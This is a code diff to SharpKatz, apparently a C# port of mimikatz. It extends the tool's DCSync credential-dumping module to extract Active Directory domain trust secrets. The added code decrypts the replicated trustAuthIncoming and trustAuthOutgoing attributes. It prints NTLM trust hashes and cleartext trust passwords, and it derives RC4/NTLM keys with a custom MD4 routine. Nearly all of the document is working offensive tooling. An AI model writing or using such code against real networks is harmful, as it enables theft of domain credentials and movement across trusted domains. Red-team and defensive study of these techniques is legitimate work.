@@ -148,6 +148,9 @@ namespace SharpKatz.Module
         const string szOID_ANSI_trustPartner = "1.2.840.113556.1.4.133";
         const string szOID_ANSI_trustAuthIncoming = "1.2.840.113556.1.4.129";
         const string szOID_ANSI_trustAuthOutgoing = "1.2.840.113556.1.4.135";
+        const string szOID_ANSI_trustDirection = "1.2.840.113556.1.4.132";
+        const string szOID_ANSI_trustType = "1.2.840.113556.1.4.136";
+        const string szOID_ANSI_trustAttributes = "1.2.840.113556.1.4.470";
 
         const string szOID_ANSI_currentValue = "1.2.840.113556.1.4.27";
 
@@ -254,6 +257,7 @@ namespace SharpKatz.Module
             szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
             szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
             szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
+            szOID_ANSI_trustDirection, szOID_ANSI_trustType, szOID_ANSI_trustAttributes,
             szOID_ANSI_currentValue,
             szOID_isDeleted
         };
@@ -1004,8 +1008,8 @@ namespace SharpKatz.Module
                             case ATT.ATT_DBCS_PWD:
                             case ATT.ATT_LM_PWD_HISTORY:
                             case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
-                                //case ATT.ATT_TRUST_AUTH_INCOMING:
-                                //case ATT.ATT_TRUST_AUTH_OUTGOING:
+                            case ATT.ATT_TRUST_AUTH_INCOMING:
+                            case ATT.ATT_TRUST_AUTH_OUTGOING:
                                 data = DecryptReplicationData(data);
                                 break;
                         }
@@ -1237,6 +1241,19 @@ namespace SharpKatz.Module
                     case ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                         DecodedReplicationData.Add(att.ToString(), data);
                         break;
+                    case ATT.ATT_TRUST_PARTNER:
+                        DecodedReplicationData.Add(att.ToString(), Encoding.Unicode.GetString(data));
+                        break;
+                    case ATT.ATT_TRUST_DIRECTION:
+                    case ATT.ATT_TRUST_TYPE:
+                    case ATT.ATT_TRUST_ATTRIBUTES:
+                        if (data.Length >= 4)
+                            DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
+                        break;
+                    case ATT.ATT_TRUST_AUTH_INCOMING:
+                    case ATT.ATT_TRUST_AUTH_OUTGOING:
+                        DecodedReplicationData.Add(att.ToString(), data);
+                        break;
                     case ATT.ATT_LOGON_HOURS:
                     default:
                         DecodedReplicationData.Add(att.ToString(), data.ToString());
@@ -1316,29 +1333,78 @@ namespace SharpKatz.Module
             }
             Console.WriteLine("  ");
 
-            if (unicodePwd != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
+            // Check if this is a trust account (TDO — trusted domain object)
+            bool isTrustAccount = false;
+            if (samAccountType != null)
             {
-                Console.WriteLine("   Credentials:");
-                if (unicodePwd != null)
-                {
-                    Console.WriteLine("   Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
-                }
-                if (ntPwdHistory != null)
-                {
-                    Console.WriteLine("   ntlm- 0              : {0}", Utility.PrintHashBytes((byte[])ntPwdHistory));
-                }
-                if (lmPwd != null)
-                {
-                    Console.WriteLine("   LM  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwd));
-                }
-                if (lmPwdHistory != null)
-                {
-                    Console.WriteLine("   lm  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwdHistory));
-                }
-                Console.WriteLine("  ");
+                try { isTrustAccount = Convert.ToUInt32(samAccountType) == (uint)SamAccountType.TRUST_ACCOUNT; }
+                catch { }
             }
 
-            DcsyncDescrUserProperties((byte[])suppCredential);
+            if (isTrustAccount)
+            {
+                // Trust-specific output
+                dic.TryGetValue("ATT_TRUST_PARTNER", out object trustPartner);
+                dic.TryGetValue("ATT_TRUST_DIRECTION", out object trustDirection);
+                dic.TryGetValue("ATT_TRUST_TYPE", out object trustType);
+                dic.TryGetValue("ATT_TRUST_ATTRIBUTES", out object trustAttributes);
+                dic.TryGetValue("ATT_TRUST_AUTH_INCOMING", out object trustAuthIn);
+                dic.TryGetValue("ATT_TRUST_AUTH_OUTGOING", out object trustAuthOut);
+
+                Console.WriteLine("   ** DOMAIN TRUST **");
+                Console.WriteLine("  ");
+                Console.WriteLine("   Partner              : {0}", trustPartner ?? "(null)");
+                if (trustDirection != null)
+                    Console.WriteLine("   Direction            : {0}", TrustDirectionToString(Convert.ToInt32(trustDirection)));
+                if (trustType != null)
+                    Console.WriteLine("   Type                 : {0}", TrustTypeToString(Convert.ToInt32(trustType)));
+                if (trustAttributes != null)
+                    Console.WriteLine("   Attributes           : 0x{0:X8}", Convert.ToInt32(trustAttributes));
+                Console.WriteLine("  ");
+
+                if (unicodePwd != null)
+                    Console.WriteLine("   Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
+
+                if (trustAuthIn != null && trustAuthIn is byte[])
+                {
+                    Console.WriteLine("  ");
+                    Console.WriteLine("   * Trust Auth Incoming *");
+                    PrintTrustAuthInformation((byte[])trustAuthIn);
+                }
+                if (trustAuthOut != null && trustAuthOut is byte[])
+                {
+                    Console.WriteLine("  ");
+                    Console.WriteLine("   * Trust Auth Outgoing *");
+                    PrintTrustAuthInformation((byte[])trustAuthOut);
+                }
+            }
+            else
+            {
+                // Normal user/computer account output
+                if (unicodePwd != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
+                {
+                    Console.WriteLine("   Credentials:");
+                    if (unicodePwd != null)
+                    {
+                        Console.WriteLine("   Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
+                    }
+                    if (ntPwdHistory != null)
+                    {
+                        Console.WriteLine("   ntlm- 0              : {0}", Utility.PrintHashBytes((byte[])ntPwdHistory));
+                    }
+                    if (lmPwd != null)
+                    {
+                        Console.WriteLine("   LM  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwd));
+                    }
+                    if (lmPwdHistory != null)
+                    {
+                        Console.WriteLine("   lm  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwdHistory));
+                    }
+                    Console.WriteLine("  ");
+                }
+
+                DcsyncDescrUserProperties((byte[])suppCredential);
+            }
         }
 
         public static void DcsyncDescrUserProperties(byte[] suppCredential)
@@ -1632,6 +1698,323 @@ namespace SharpKatz.Module
             cpb.Buffer = Marshal.AllocHGlobal(bytes.Length);
             Marshal.Copy(bytes, 0, cpb.Buffer, bytes.Length);
             return cpb;
+        }
+
+        /// <summary>
+        /// Parse and display LSAPR_AUTH_INFORMATION structures from trust auth blobs.
+        /// Format: Count (DWORD) + ByteOffset (DWORD) + array of auth info entries.
+        /// Each entry: LastUpdateTime (FILETIME=8) + AuthType (DWORD=4) + AuthInfoLength (DWORD=4) + AuthInfo (variable)
+        /// </summary>
+        private static void PrintTrustAuthInformation(byte[] authData)
+        {
+            if (authData == null || authData.Length < 8)
+            {
+                Console.WriteLine("    (empty or invalid)");
+                return;
+            }
+
+            try
+            {
+                int offset = 0;
+
+                // LSAPR_TRUST_DOMAIN_AUTH_INFORMATION structure:
+                // First 4 bytes = count of LSAPR_AUTH_INFORMATION entries
+                // Next 4 bytes = byte offset to the auth info array (from start)
+                uint count = BitConverter.ToUInt32(authData, offset);
+                offset += 4;
+
+                // Byte offset (usually 8, pointing right after these two DWORDs)
+                uint byteOffset = BitConverter.ToUInt32(authData, offset);
+                offset += 4;
+
+                if (count == 0 || count > 100)
+                {
+                    // Try alternative: the blob might be a raw array of auth info entries
+                    // without the count/offset header (mimikatz handles both)
+                    offset = 0;
+                    PrintTrustAuthInfoRaw(authData, offset);
+                    return;
+                }
+
+                Console.WriteLine("    [{0} entry(ies)]", count);
+
+                for (uint i = 0; i < count && offset + 16 <= authData.Length; i++)
+                {
+                    // LastUpdateTime — FILETIME (8 bytes)
+                    long fileTime = BitConverter.ToInt64(authData, offset);
+                    offset += 8;
+
+                    // AuthType — DWORD
+                    uint authType = BitConverter.ToUInt32(authData, offset);
+                    offset += 4;
+
+                    // AuthInfoLength — DWORD
+                    uint authInfoLen = BitConverter.ToUInt32(authData, offset);
+                    offset += 4;
+
+                    DateTime updateTime;
+                    try { updateTime = DateTime.FromFileTimeUtc(fileTime); }
+                    catch { updateTime = DateTime.MinValue; }
+
+                    string timeStr = updateTime != DateTime.MinValue
+                        ? updateTime.ToString("yyyy-MM-dd HH:mm:ss")
+                        : "(unknown)";
+
+                    if (authInfoLen > (uint)(authData.Length - offset))
+                        authInfoLen = (uint)(authData.Length - offset);
+
+                    byte[] authInfo = new byte[authInfoLen];
+                    if (authInfoLen > 0)
+                        Array.Copy(authData, offset, authInfo, 0, (int)authInfoLen);
+                    offset += (int)authInfoLen;
+
+                    switch (authType)
+                    {
+                        case 0: // TRUST_AUTH_TYPE_NONE
+                            Console.WriteLine("    [{0}] Type: NONE — Updated: {1}", i, timeStr);
+                            break;
+                        case 1: // TRUST_AUTH_TYPE_NT4OWF — raw 16-byte NTLM hash
+                            Console.WriteLine("    [{0}] Type: NT4OWF — Updated: {1}", i, timeStr);
+                            if (authInfoLen > 0)
+                            {
+                                Console.WriteLine("          NTLM     : {0}", Utility.PrintHashBytes(authInfo));
+                            }
+                            break;
+                        case 2: // TRUST_AUTH_TYPE_CLEAR (RC4 / NT hash)
+                            Console.WriteLine("    [{0}] Type: CLEAR — Updated: {1}", i, timeStr);
+                            if (authInfoLen > 0)
+                            {
+                                // This is the cleartext trust password
+                                string cleartext = Encoding.Unicode.GetString(authInfo);
+                                Console.WriteLine("          Password : {0}", cleartext);
+                                Console.WriteLine("          Raw      : {0}", Utility.PrintHashBytes(authInfo));
+                                // Compute RC4/NTLM hash from cleartext password
+                                if (authInfoLen > 0)
+                                {
+                                    byte[] ntHash = ComputeMD4(authInfo);
+                                    if (ntHash != null)
+                                        Console.WriteLine("          RC4/NTLM : {0}", Utility.PrintHashBytes(ntHash));
+                                }
+                            }
+                            break;
+                        case 3: // TRUST_AUTH_TYPE_VERSION
+                            Console.WriteLine("    [{0}] Type: VERSION — Updated: {1}", i, timeStr);
+                            if (authInfoLen >= 4)
+                                Console.WriteLine("          Version  : {0}", BitConverter.ToUInt32(authInfo, 0));
+                            break;
+                        default:
+                            Console.WriteLine("    [{0}] Type: 0x{1:X} — Updated: {2}", i, authType, timeStr);
+                            if (authInfoLen > 0)
+                                Console.WriteLine("          Data     : {0}", Utility.PrintHashBytes(authInfo));
+                            break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("    [-] Error parsing trust auth info: {0}", ex.Message);
+                Console.WriteLine("    Raw data: {0}", Utility.PrintHashBytes(authData));
+            }
+        }
+
+        /// <summary>
+        /// Fallback parser: try parsing raw auth info entries without count/offset header
+        /// </summary>
+        private static void PrintTrustAuthInfoRaw(byte[] data, int offset)
+        {
+            int idx = 0;
+            while (offset + 16 <= data.Length)
+            {
+                long fileTime = BitConverter.ToInt64(data, offset);
+                offset += 8;
+
+                uint authType = BitConverter.ToUInt32(data, offset);
+                offset += 4;
+
+                uint authInfoLen = BitConverter.ToUInt32(data, offset);
+                offset += 4;
+
+                if (authInfoLen > (uint)(data.Length - offset))
+                    break;
+
+                byte[] authInfo = new byte[authInfoLen];
+                if (authInfoLen > 0)
+                    Array.Copy(data, offset, authInfo, 0, (int)authInfoLen);
+                offset += (int)authInfoLen;
+
+                DateTime updateTime;
+                try { updateTime = DateTime.FromFileTimeUtc(fileTime); }
+                catch { break; }
+
+                string timeStr = updateTime != DateTime.MinValue && updateTime.Year > 1601
+                    ? updateTime.ToString("yyyy-MM-dd HH:mm:ss")
+                    : "(unknown)";
+
+                switch (authType)
+                {
+                    case 1:
+                        Console.WriteLine("    [{0}] Type: NT4OWF — Updated: {1}", idx, timeStr);
+                        if (authInfoLen > 0)
+                        {
+                            Console.WriteLine("          NTLM     : {0}", Utility.PrintHashBytes(authInfo));
+                        }
+                        break;
+                    case 2:
+                        Console.WriteLine("    [{0}] Type: CLEAR — Updated: {1}", idx, timeStr);
+                        if (authInfoLen > 0)
+                        {
+                            Console.WriteLine("          Password : {0}", Encoding.Unicode.GetString(authInfo));
+                            Console.WriteLine("          Raw      : {0}", Utility.PrintHashBytes(authInfo));
+                            byte[] ntHash = ComputeMD4(authInfo);
+                            if (ntHash != null)
+                                Console.WriteLine("          RC4/NTLM : {0}", Utility.PrintHashBytes(ntHash));
+                        }
+                        break;
+                    case 3:
+                        Console.WriteLine("    [{0}] Type: VERSION — Updated: {1}", idx, timeStr);
+                        if (authInfoLen >= 4)
+                            Console.WriteLine("          Version  : {0}", BitConverter.ToUInt32(authInfo, 0));
+                        break;
+                    default:
+                        Console.WriteLine("    [{0}] Type: 0x{1:X} — Updated: {2}", idx, authType, timeStr);
+                        if (authInfoLen > 0)
+                            Console.WriteLine("          Data     : {0}", Utility.PrintHashBytes(authInfo));
+                        break;
+                }
+                idx++;
+            }
+
+            if (idx == 0)
+                Console.WriteLine("    Raw data: {0}", Utility.PrintHashBytes(data));
+        }
+
+        /// <summary>
+        /// Compute MD4 hash (NTLM hash) from raw bytes — pure managed RFC 1320 implementation
+        /// </summary>
+        private static byte[] ComputeMD4(byte[] input)
+        {
+            try
+            {
+                uint a0 = 0x67452301;
+                uint b0 = 0xefcdab89;
+                uint c0 = 0x98badcfe;
+                uint d0 = 0x10325476;
+
+                // Pre-processing: pad message
+                int origLen = input.Length;
+                int padLen = 56 - ((origLen + 1) % 64);
+                if (padLen < 0) padLen += 64;
+                byte[] msg = new byte[origLen + 1 + padLen + 8];
+                Array.Copy(input, msg, origLen);
+                msg[origLen] = 0x80;
+                long bitLen = (long)origLen * 8;
+                Array.Copy(BitConverter.GetBytes(bitLen), 0, msg, msg.Length - 8, 8);
+
+                for (int i = 0; i < msg.Length; i += 64)
+                {
+                    uint[] x = new uint[16];
+                    for (int j = 0; j < 16; j++)
+                        x[j] = BitConverter.ToUInt32(msg, i + j * 4);
+
+                    uint a = a0, b = b0, c = c0, d = d0;
+
+                    // Round 1: F(X,Y,Z) = (X & Y) | (~X & Z)
+                    a = RL(a + ((b & c) | (~b & d)) + x[0], 3);
+                    d = RL(d + ((a & b) | (~a & c)) + x[1], 7);
+                    c = RL(c + ((d & a) | (~d & b)) + x[2], 11);
+                    b = RL(b + ((c & d) | (~c & a)) + x[3], 19);
+                    a = RL(a + ((b & c) | (~b & d)) + x[4], 3);
+                    d = RL(d + ((a & b) | (~a & c)) + x[5], 7);
+                    c = RL(c + ((d & a) | (~d & b)) + x[6], 11);
+                    b = RL(b + ((c & d) | (~c & a)) + x[7], 19);
+                    a = RL(a + ((b & c) | (~b & d)) + x[8], 3);
+                    d = RL(d + ((a & b) | (~a & c)) + x[9], 7);
+                    c = RL(c + ((d & a) | (~d & b)) + x[10], 11);
+                    b = RL(b + ((c & d) | (~c & a)) + x[11], 19);
+                    a = RL(a + ((b & c) | (~b & d)) + x[12], 3);
+                    d = RL(d + ((a & b) | (~a & c)) + x[13], 7);
+                    c = RL(c + ((d & a) | (~d & b)) + x[14], 11);
+                    b = RL(b + ((c & d) | (~c & a)) + x[15], 19);
+
+                    // Round 2: G(X,Y,Z) = (X & Y) | (X & Z) | (Y & Z), constant 0x5A827999
+                    a = RL(a + ((b & c) | (b & d) | (c & d)) + x[0] + 0x5A827999, 3);
+                    d = RL(d + ((a & b) | (a & c) | (b & c)) + x[4] + 0x5A827999, 5);
+                    c = RL(c + ((d & a) | (d & b) | (a & b)) + x[8] + 0x5A827999, 9);
+                    b = RL(b + ((c & d) | (c & a) | (d & a)) + x[12] + 0x5A827999, 13);
+                    a = RL(a + ((b & c) | (b & d) | (c & d)) + x[1] + 0x5A827999, 3);
+                    d = RL(d + ((a & b) | (a & c) | (b & c)) + x[5] + 0x5A827999, 5);
+                    c = RL(c + ((d & a) | (d & b) | (a & b)) + x[9] + 0x5A827999, 9);
+                    b = RL(b + ((c & d) | (c & a) | (d & a)) + x[13] + 0x5A827999, 13);
+                    a = RL(a + ((b & c) | (b & d) | (c & d)) + x[2] + 0x5A827999, 3);
+                    d = RL(d + ((a & b) | (a & c) | (b & c)) + x[6] + 0x5A827999, 5);
+                    c = RL(c + ((d & a) | (d & b) | (a & b)) + x[10] + 0x5A827999, 9);
+                    b = RL(b + ((c & d) | (c & a) | (d & a)) + x[14] + 0x5A827999, 13);
+                    a = RL(a + ((b & c) | (b & d) | (c & d)) + x[3] + 0x5A827999, 3);
+                    d = RL(d + ((a & b) | (a & c) | (b & c)) + x[7] + 0x5A827999, 5);
+                    c = RL(c + ((d & a) | (d & b) | (a & b)) + x[11] + 0x5A827999, 9);
+                    b = RL(b + ((c & d) | (c & a) | (d & a)) + x[15] + 0x5A827999, 13);
+
+                    // Round 3: H(X,Y,Z) = X ^ Y ^ Z, constant 0x6ED9EBA1
+                    a = RL(a + (b ^ c ^ d) + x[0] + 0x6ED9EBA1, 3);
+                    d = RL(d + (a ^ b ^ c) + x[8] + 0x6ED9EBA1, 9);
+                    c = RL(c + (d ^ a ^ b) + x[4] + 0x6ED9EBA1, 11);
+                    b = RL(b + (c ^ d ^ a) + x[12] + 0x6ED9EBA1, 15);
+                    a = RL(a + (b ^ c ^ d) + x[2] + 0x6ED9EBA1, 3);
+                    d = RL(d + (a ^ b ^ c) + x[10] + 0x6ED9EBA1, 9);
+                    c = RL(c + (d ^ a ^ b) + x[6] + 0x6ED9EBA1, 11);
+                    b = RL(b + (c ^ d ^ a) + x[14] + 0x6ED9EBA1, 15);
+                    a = RL(a + (b ^ c ^ d) + x[1] + 0x6ED9EBA1, 3);
+                    d = RL(d + (a ^ b ^ c) + x[9] + 0x6ED9EBA1, 9);
+                    c = RL(c + (d ^ a ^ b) + x[5] + 0x6ED9EBA1, 11);
+                    b = RL(b + (c ^ d ^ a) + x[13] + 0x6ED9EBA1, 15);
+                    a = RL(a + (b ^ c ^ d) + x[3] + 0x6ED9EBA1, 3);
+                    d = RL(d + (a ^ b ^ c) + x[11] + 0x6ED9EBA1, 9);
+                    c = RL(c + (d ^ a ^ b) + x[7] + 0x6ED9EBA1, 11);
+                    b = RL(b + (c ^ d ^ a) + x[15] + 0x6ED9EBA1, 15);
+
+                    a0 += a; b0 += b; c0 += c; d0 += d;
+                }
+
+                byte[] result = new byte[16];
+                Array.Copy(BitConverter.GetBytes(a0), 0, result, 0, 4);
+                Array.Copy(BitConverter.GetBytes(b0), 0, result, 4, 4);
+                Array.Copy(BitConverter.GetBytes(c0), 0, result, 8, 4);
+                Array.Copy(BitConverter.GetBytes(d0), 0, result, 12, 4);
+                return result;
+            }
+            catch
+            {
+                return null;
+            }
+        }
+
+        private static uint RL(uint x, int n)
+        {
+            return (x << n) | (x >> (32 - n));
+        }
+
+        private static string TrustDirectionToString(int direction)
+        {
+            switch (direction)
+            {
+                case 0: return "Disabled";
+                case 1: return "Inbound";
+                case 2: return "Outbound";
+                case 3: return "Bidirectional";
+                default: return string.Format("0x{0:X}", direction);
+            }
+        }
+
+        private static string TrustTypeToString(int trustType)
+        {
+            switch (trustType)
+            {
+                case 1: return "Windows NT (downlevel)";
+                case 2: return "Active Directory (uplevel)";
+                case 3: return "MIT Kerberos realm";
+                case 4: return "DCE realm";
+                default: return string.Format("0x{0:X}", trustType);
+            }
         }
 
         private static string SamAccountTypeToString(uint accountType)
